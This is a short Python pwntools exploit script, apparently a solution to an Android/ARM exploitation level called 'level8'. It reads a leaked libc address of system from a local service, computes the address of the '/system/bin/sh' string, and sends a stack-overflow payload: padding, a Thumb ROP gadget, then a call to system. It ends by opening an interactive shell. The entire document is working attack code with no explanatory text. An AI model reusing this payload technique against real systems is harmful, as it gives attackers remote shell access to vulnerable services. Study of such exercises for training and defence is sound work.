#!/usr/bin/env python
from pwn import *
 
#p = process('./level8')
p = remote('127.0.0.1',10003)

system_addr_str = p.recvuntil('\n')
system_addr = int(system_addr_str,16)
print "system_addr = " + hex(system_addr)

p.recvuntil('\n')



# code in libc.so

#.text:00039960                 EXPORT system
libc_system = 0x00039960

#.rodata:0005AAFF aSystemBinSh    DCB "/system/bin/sh",0
libc_binsh = 0x0005AAFF 

binsh_addr = system_addr - 1 + (libc_binsh - libc_system)
print "/system/bin/sh addr = " + hex(binsh_addr)



# gadget in level8
# 0x00008a12 : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
gadget1 = 0x00008a12 + 1



payload =  '\x00'*132 + p32(gadget1) + '\x00'*12 + p32(binsh_addr) + "\x00"*4 + p32(system_addr)

p.send(payload)
 
p.interactive()

